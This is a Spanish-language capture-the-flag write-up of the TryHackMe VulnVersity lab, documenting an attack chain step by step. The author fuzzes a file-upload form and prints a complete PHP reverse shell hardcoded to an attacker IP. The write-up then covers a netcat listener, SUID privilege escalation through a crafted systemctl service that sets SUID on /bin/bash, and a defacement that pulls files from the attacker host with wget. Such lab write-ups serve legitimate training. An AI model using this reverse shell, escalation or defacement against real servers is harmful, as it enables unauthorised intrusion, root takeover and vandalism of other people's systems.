# VulnVersity Writeup | Try Hack Me 
_by Fz3r0 💀_

![image](https://user-images.githubusercontent.com/94720207/212569792-d66c250e-4fcd-4477-a013-9b71c0e329fa.png)


#### Keywords: `CTF` `Try Hack Me` `VulnVersity` `Writeup` `Reccon` `Fuzzing` `Worldlist` `Burpsuite` `Web Server Exploitation` `PHP Reverse Shell` `Upload Vulnerability` `RCI` `PrivEsc` `SUID PrivEsc` `GTFObins` `URL Defacement`

## Full Attack Timelapse

- Puedes ver el timelapse del Ataque completo en mi Youtube:

    - **ATTACK TIMELAPSE: https://youtu.be/9hcoGszYS0M**

## Datos de los objetos involucrados: 


- `[⭕] Host Atactante IP (local):.................. 192.168.30.152`

- `[🔴] **LHOST** - Host Atactante IP (túnel):...... 10.6.22.157`

- `[🔵] **RHOST** - Host Víctima IP/Dominio.TLD:.... 10.10.92.191`


## Resultados de Auditoría de Sistema Operativo: 


- `[🔵] Reporte de auditoría a Víctima/RHOST:....... 10.10.92.191`

- `[🔵] Estado Actual de Víctima/RHOST:............. Host Activo`

- `[🔵] Sistema Operativo de Víctima/RHOST.......... Linux`

- `[🔵] Resultados basados en TTL:.................. 61`

- `[⚪] Fecha de Auditoría y Muestreo:.............. 2023-01-15 10:45:29`

- `[💀] Auditoría de Seguridad realizada por:....... Fz3r0 💀`


## Resultados Preliminares de Auditoría de Puertos: 


- [🔴] Se encontraron <(( 6 ))> Puertos ABIERTOS en Víctima/RHOST:

    - [💀] -->> **` 21,22,139,445,3128,3333 `**


## Resultados Avanzados de Auditoría de Puertos & Servicios: 


- [🔴] Detalles de Servicios & Versiones en sockets de Víctima/RHOST: 

    - [💀] -->>  21/tcp   open  ftp         vsftpd 3.0.3


    - [💀] -->>  22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)


    - [💀] -->>  139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)


    - [💀] -->>  445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)


    - [💀] -->>  3128/tcp open  http-proxy  Squid http proxy 3.5.12


    - [💀] -->>  3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))


## Auditoría Preliminar de Vulnerabilidades en Víctima/RHOST: 


- [💀] **Se han encontrado las siguientes posibles vulnerabilidades en la Víctima:**

```
|_smb-vuln-ms10-061: false

| smb-vuln-regsvc-dos: 

|   VULNERABLE:

|   Service regsvc in Microsoft Windows systems vulnerable to denial of service

|     State: VULNERABLE

|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference

|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes

|       while working on smb-enum-sessions.

|_          

|_smb-vuln-ms10-054: false

```

- Esta vulnerabilidad es solo para DOS, cosa que no me interesa mucho por ahora. 

### Reporte Completos de Port Scan

```java
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 02-Fz3r0_PortFullReport.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.92 scan initiated Sun Jan 15 10:45:55 2023 as: nmap -p 21,22,139,445,3128,3333 -sC -sV -oN 02-Fz3r0_PortFullReport.txt 1
       │ 0.10.92.191
   2   │ Nmap scan report for 10.10.92.191
   3   │ Host is up (0.13s latency).
   4   │ 
   5   │ PORT     STATE SERVICE     VERSION
   6   │ 21/tcp   open  ftp         vsftpd 3.0.3
   7   │ 22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
   8   │ | ssh-hostkey: 
   9   │ |   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
  10   │ |   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
  11   │ |_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
  12   │ 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  13   │ 445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
  14   │ 3128/tcp open  http-proxy  Squid http proxy 3.5.12
  15   │ |_http-server-header: squid/3.5.12
  16   │ |_http-title: ERROR: The requested URL could not be retrieved
  17   │ 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
  18   │ |_http-server-header: Apache/2.4.18 (Ubuntu)
  19   │ |_http-title: Vuln University
  20   │ Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  21   │ 
  22   │ Host script results:
  23   │ |_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
  24   │ | smb-os-discovery: 
  25   │ |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  26   │ |   Computer name: vulnuniversity
  27   │ |   NetBIOS computer name: VULNUNIVERSITY\x00
  28   │ |   Domain name: \x00
  29   │ |   FQDN: vulnuniversity
  30   │ |_  System time: 2023-01-15T10:46:20-05:00
  31   │ | smb2-time: 
  32   │ |   date: 2023-01-15T15:46:19
  33   │ |_  start_date: N/A
  34   │ | smb-security-mode: 
  35   │ |   account_used: guest
  36   │ |   authentication_level: user
  37   │ |   challenge_response: supported
  38   │ |_  message_signing: disabled (dangerous, but default)
  39   │ | smb2-security-mode: 
  40   │ |   3.1.1: 
  41   │ |_    Message signing enabled but not required
  42   │ |_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  43   │ 
  44   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  45   │ # Nmap done at Sun Jan 15 10:46:24 2023 -- 1 IP address (1 host up) scanned in 29.14 seconds
```

## Directory Discovery & Fuzzing


- Utilizaré GoBuster aunque podría utilizar alguna otra tool como DirSearch. 

- GoBuster:

```sh
gobuster dir -u http://$ip_target:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
- DirSearch:

```sh
dirsearch -u http://$ip_target:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e "php,txt,html" -t 150

# Versión sin filtro de extensión:

dirsearch -u http://$ip_target:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e "" -t 150

```

- Resultados:

```java
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.92.191:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/15 10:52:59 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.92.191:3333/images/]
/css                  (Status: 301) [Size: 317] [--> http://10.10.92.191:3333/css/]   
/js                   (Status: 301) [Size: 316] [--> http://10.10.92.191:3333/js/]    
/fonts                (Status: 301) [Size: 319] [--> http://10.10.92.191:3333/fonts/] 
/internal             (Status: 301) [Size: 322] [--> http://10.10.92.191:3333/internal/]
Progress: 19829 / 220561 (8.99%)                                                       ^C
[!] Keyboard interrupt detected, terminating.
                                                                                        
===============================================================
2023/01/15 10:57:25 Finished
===============================================================
```

- Los directorios que encontré se resumen en lo siguiente:

    - **/images - La base de datos de imágenes a la vista pública (posible vulnerabilidad)**
    - /css - CSS (nada importante)                    
    - /js - javascript (nada importante)                      
    - /fonts - Fonts (nada importante)                
    - **/internal (uploads que solo permiten un tipo de archivo desconocido)**

- Volveré a Fuzzear esos directorios, en el único donde encontré algo fue `/internal`

```sh
gobuster dir -u http://$ip_target:3333/internal -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
```java
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.173.121:3333/internal
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/15 14:08:43 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 332] [--> http://10.10.173.121:3333/internal/uploads/]
/css                  (Status: 301) [Size: 328] [--> http://10.10.173.121:3333/internal/css/]    
Progress: 54195 / 220561 (24.57%)                                                               ^C
[!] Keyboard interrupt detected, terminating.
                                                                                                 
===============================================================
2023/01/15 14:21:40 Finished
===============================================================
```

- El directorio importante que encontré aquí fue `/uploads`


## File upload extension Fuzzing  


- Al entrar a internal me redirige a una extensión `php` = `http://10.10.92.191:3333/internal/index.php`

- No es posible usar extensión ni `.jpg` ni `.php` para subir archivos, que fué lo primero que se me ocurrió. 

- Así que Utilizaré la lista de `payload all the things` de `extensiones PHP`:

    - http://10.10.92.191:3333/internal/index.php

```sh
❯ subl php_extensions_f0.txt
❯ cat php_extensions_f0.txt -l java
───────┬──────────────────────────────────────────────────────────────────────────────────────
       │ File: php_extensions_f0.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────
   1   │ .php
   2   │ .php3
   3   │ .php4
   4   │ .php5
   5   │ .php7
   6   │ .pht
   7   │ .phps
   8   │ .phar
   9   │ .phpt
  10   │ .pgif
  11   │ .phtml
  12   │ .phtm
  13   │ .inc
───────┴──────────────────────────────────────────────────────────────────────────────────────

  ╱  ~/Doc/01_-_Fz3r0_T/VulnVersity ╱ ✔  
```

- Ahora para Fuzzear utilizaré `Burpsuite`


### Burpsuite: Proxy / Intercept + Intruder / Sniper - Fuzzing


- Con la wordlist ya en mi directorio es hora de Fuzzear con `Intruder`:`Sniper`

- Para eso primero debo interceptar un `post request` cualquiera que yo mande para después modificarlo:

```http
POST /internal/index.php HTTP/1.1
Host: 10.10.92.191:3333
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.92.191:3333/internal/index.php
Content-Type: multipart/form-data; boundary=---------------------------27776735518068408812742901161
Content-Length: 5835
Origin: http://10.10.92.191:3333
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------27776735518068408812742901161
Content-Disposition: form-data; name="file"; filename="php_shell.php"  <<<--- ESTA EXTENSIÓN .php ES LA QUE VOY A FUZZEAR (EL PAYLOAD YA VENDRÁ ABAJO)
Content-Type: application/x-php

.
.
.
reverse shell payload... (ver abajo)
```

- Modifico para que solo se vaya a Fuzzear la siguiente linea con el string `.php` **INCLUYENDO EL `.`**

```java
Content-Disposition: form-data; name="file"; filename="php_shell§.php§"
```

![image](https://user-images.githubusercontent.com/94720207/212696950-5b184db1-b474-4b12-8a27-1f40ba9e9ec2.png)

- Agrego mi wordlist en la parte de `payload` dentro del mismo `sniper`.

- Finalmente click en `start attack`

    - NOTA: En este caso todos me repsonden igual con lenght `737` y status `200`, en estos casos se puede solucionar: **`DESACTIVANDO EL URL ENCODIG`** _parte inferior de la pagían de payloads_

- Ahora si, uno de ellos me arroja resultado `723` de lenght el cual difiere a todos los demás y correspondería a la extensión `.phtml` 

![image](https://user-images.githubusercontent.com/94720207/212696500-0fd14173-76ef-4307-a3c1-900008f2cc7a.png)

- Ahora es tiempo de modificar la extensión de la reverse shell PHP que utilicé:   

```sh
❯ mv php_shell.php php_shell.phtml
❯ ll
.rw-r--r-- fz3r0 fz3r0  12 KB Sun Jan 15 12:58:15 2023  00_Fz3r0_WriteUp-VulnVersity_THM.md
.rw-r--r-- root  root  518 B  Sun Jan 15 10:45:54 2023  01-Fz3r0_Psycho_Audit_Open_Ports.txt
.rw-r--r-- root  root  2.0 KB Sun Jan 15 10:46:24 2023  02-Fz3r0_PortFullReport.txt
.rw-r--r-- root  root   16 KB Sun Jan 15 10:59:00 2023  03-Fz3r0_PortFullReport_Vuln.txt
.rw-r--r-- fz3r0 fz3r0  28 KB Sat Jan 14 21:27:54 2023  Fz3r0_PsychoMantis_v2.0.py
.rw-r--r-- fz3r0 fz3r0  75 B  Sun Jan 15 12:41:42 2023  php_extensions_f0.txt
.rw-r--r-- fz3r0 fz3r0 5.4 KB Sun Jan 15 12:58:48 2023  php_shell.phtml   <<<----- PAYLOAD MALICIOSO CON SHELL DE PHTML
.rw-r--r-- fz3r0 fz3r0   0 B  Sun Jan 15 10:56:32 2023  upload_test.jpg        
```

### Reverse Shell Utilizada

- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.6.22.157';  // CHANGE THIS
$port = 666;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

## Subiendo el payload malicioso y ejecutando Reverse Shell

- Ahora que sé que formato se puede subir y ya hice mi reversehsell con ese formato solo lo subo a la página, recibo un mensaje de success:

![image](https://user-images.githubusercontent.com/94720207/212561314-d5b56999-5b38-41f3-88bf-8cdde2fb7427.png)

- Inspeccionando:

```html
<html>
<head>
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<style>
html, body {
    height: 30%;
}
html {
    display: table;
    margin: auto;
}
body {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
}
</style>
</head>
<body>
<form action="index.php" method="post" enctype="multipart/form-data">
    <h3>Upload</h3><br />
    <input type="file" name="file" id="file">
    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
</form>
Success</body>  <<<------ SE LOGRÓ SUBIR :D
</html>
```

- En la página de `http://10.10.173.121:3333/internal/uploads/` que logré fuzzear al inicio es donde se subió la shell:

![image](https://user-images.githubusercontent.com/94720207/212561889-8d590279-0ebf-4296-a6fc-8023511cffcd.png)

- Ahora solo falta ejecutarla mientras escucho con `netcat`:

1. Escucho con netcat en el puerto `666` qye tiene mi payload de phtml

```sh
❯ rlwrap nc -nlvp 666
listening on [any] 666 ...

```

2. Doy click a la shell para ejecutarla:

![image](https://user-images.githubusercontent.com/94720207/212562018-64fb5877-8b4e-4f5b-b851-5581e4a77aca.png)

3. Obtengo la reverse shell con permisos bajos:

```sh
❯ rlwrap nc -nlvp 666
listening on [any] 666 ...
connect to [10.6.22.157] from (UNKNOWN) [10.10.173.121] 37646
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 14:13:48 up 19 min,  0 users,  load average: 0.00, 0.01, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
whoami
www-data
pwd
/
$ 
```

## Obteniendo Shell Interactiva:

- Usando `rlwrap` no es necesario del todo, de hecho solo usaré el siguiente comando:

    - `python -c 'import pty; pty.spawn("/bin/bash")'`

```sh

whoami
www-data
python -c 'import pty; pty.spawn("/bin/bash")'

www-data@vulnuniversity:/$  <<<----- MEJOR :)
```    

- Pero el procedimiento completo es:    

- Del lado de la máquina comprometida:

    - `python -c 'import pty; pty.spawn("/bin/bash")'`
    - Salir con `ctrl+z`

- Del lado del atacante:

    - `stty raw -echo`         
    - `rlwrap nc -nlvp 666`

- Del lado de la máquina comprometida:

    - `export TERM=screen`

## PrivEsc

- Intentos con los easy PrivEsc comunes:

1. Buscando posibilidad de sudo sudo -l

```sh
sudo -l 
sudo -l -l 
```

2. Buscando SUIDs

```sh
find / - name -perm -u=s -type f 2>/dev/null
```
```sh
find / - name -perm -u=s -type f 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl   <<<--------- SUID no default, encontrado en GTFObins!!!
/bin/ping
/bin/fusermount
/sbin/mount.cifs
www-data@vulnuniversity:/$ 
```

- Aquí encuentro algunos binarios que no son default y revisando en `GTFObins` encontré `systemctl`

### Metodología SUID PrivEsc de `systemctl`

- https://gtfobins.github.io/gtfobins/systemctl/

```sh
sudo install -m =xs $(which systemctl) .     # ESTE ES PARA HACER LA MÁQUINA VULNERABLE

# ESTE ES EL EXPLOIT QUE REGRESA UN OUTPUT DE COMANDO

TF=$(mktemp).service                         
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"   <<<------ CAMBIAR!!!   
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

- Al final, creo un mejor comando que sara SUID a la shell `ExecStart=/bin/sh -c "id > /tmp/output"`

- Pegar linea por linea apartir de `install` (o mejor todas para evitar error)

```sh
TF=$(mktemp).service                         
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash" 

[Install]

WantedBy=multi-user.target' > $TF

systemctl link $TF

systemctl enable --now $TF


```

- Resultado:


```sh
TF=$(mktemp).service                         
echo '[Service]
Type=oneshot
TF=$(mktemp).service                         
www-data@vulnuniversity:/$ echo '[Service]
> Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash" 
ExecStart=/bin/sh -c "chmod +s /bin/bash" 
[Install]
[Install]
WantedBy=multi-user.target' > $TF
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl link $TF
Created symlink from /etc/systemd/system/tmp.qvmr1y5AT7.service to /tmp/tmp.qvmr1y5AT7.service.
systemctl enable --now $TF
systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.qvmr1y5AT7.service to /tmp/tmp.qvmr1y5AT7.service.
www-data@vulnuniversity:/$ 
```

- Ahora si ejecuto la `/bin/bash` ya tendré permisos de `root`:

```sh
bash
bash
whoami
whoami
www-data   <<<------ AÚN NO SOY ROOT, AGREGAR -p
bash-4.3$ 
```

- Agregando `-p`

```sh
bash -p
bash -p
whoami
whoami
root      <<<------- ROOT!!!
id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-4.3# 
```

- Tengo full PrivEsc


## Flag Capture

### User

- `user.txt` se encuentra cuando se compromete el webserver, no es necesario tiener privilegios. 

- Se encuentra solo enumerando el home de la máquina en `/home/bob`. Se puede buscar también por extensión `*.txt`

```sh
cd /home
ls -la
total 12
drwxr-xr-x  3 root root 4096 Jul 31  2019 .
drwxr-xr-x 23 root root 4096 Jul 31  2019 ..
drwxr-xr-x  2 bill bill 4096 Jul 31  2019 bill
cd bill
ls -la
total 24
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 .
drwxr-xr-x 3 root root 4096 Jul 31  2019 ..
-rw-r--r-- 1 bill bill  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 bill bill 3771 Jul 31  2019 .bashrc
-rw-r--r-- 1 bill bill  655 Jul 31  2019 .profile
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt   <<<------ USER FLAG
$ 
```

### Root

- `root.txt` se encuentra cuando se hace PrivEsc

- Se encuentra en la carpeta `/root`

```sh
cd root
pwd
pwd
/root
ls -la
ls -la
total 28
drwx------  4 root root 4096 Jul 31  2019 .
drwxr-xr-x 23 root root 4096 Jul 31  2019 ..
lrwxrwxrwx  1 root root    9 Jul 31  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul 31  2019 .cache
drwxr-xr-x  2 root root 4096 Jul 31  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Jul 31  2019 root.txt   <<<------ ROOT FLAG
bash-4.3# 
```

## Defacement


- Lo más fácil es buscar por `/var/www` o cualquier directorio que sabemos que existe en la URL, como "internal"

    - `find / -type d -name 'internal'` 

- Ahora solo hay ue crear un servidor http en python para descargar mis archvos a su servidor:

    - `python3 -m http.server 8000`   

- Descargo desde la víctima mi `index.html` y mi imagen `fz3r0_hell_0.jpg`  

    - `wget http://10.6.22.157:8000/index.html`  
    - `wget http://10.6.22.157:8000/fz3r0_hell_0.jpg`

- Elimino o cambio el nombre del index original y listo! Defacement de URL  

### Antes de Defacement:

![image](https://user-images.githubusercontent.com/94720207/212697570-133d1647-ea49-4faa-baea-10749bf915f4.png)

### Después de Defacement:

![image](https://user-images.githubusercontent.com/94720207/212698089-f295da97-1162-4110-8562-b03231f0e321.png)

## PoC

- I'm Fz3r0 and the Sun no longer rises...

![image](https://user-images.githubusercontent.com/94720207/212565909-12f8cef8-7349-470b-ae8c-cf4c6ad1a3a2.png)

## Referencias

- https://tryhackme.com/room/vulnversity
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md    
